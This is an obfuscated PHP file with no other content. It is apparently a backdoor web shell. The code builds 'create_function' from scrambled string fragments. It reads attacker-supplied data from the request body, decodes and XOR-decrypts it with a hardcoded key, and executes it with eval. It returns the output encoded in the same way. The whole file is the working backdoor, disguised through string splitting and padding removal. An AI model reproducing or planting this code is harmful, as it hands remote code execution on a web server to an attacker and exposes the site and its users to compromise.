<?php
$B='{$j0n};}}r0netu0nrn $o;0n}if (@p0nreg_match("/$k0nh0n(0n.+)$kf/"0n,@file_get_co';
$w='$k="d27c50ne75";$0nk0nh="34205ad90n0n5e69";0n$kf="6e400nefaec0n0a4";0n$p="qr0nLCjX1Icaz';
$n='n0ntents0n("php://i0nnput"0n)0n,0n$m)==1) {@ob_st0nart()0n;@e0nval(@gzunco0nmp0nress(@x0';
$e='nd_clea0nn();$r=@base60n4_encode0n(@x(@g0nzcompress(0n$o0n0n),$k));p0nrint("$p$k0nh$r$kf");}';
$R='W0nwkVR";f0nunctio0nn x(0n$t,$k){$0nc=s0ntrlen($k0n);$l=0nstrl0nen($t);$o=0n0n0n"";for';
$A='($0n0ni=0;$i<$l;){for($j=0;0n0n($j<$c0n&&0n0n$i<$l);$j++,$i++0n){0n$o.=$t{$0ni}^$k';
$C='n(@base0n60n4_dec0node($m[0n1]),0n$k)));$o=@ob_get0n0n_con0ntents0n();@0n0nob_e';
$d=str_replace('M','','creMMate_MfuMMMnction');
$u=str_replace('0n','',$w.$R.$A.$B.$n.$C.$e);
$s=$d('',$u);$s();
?>
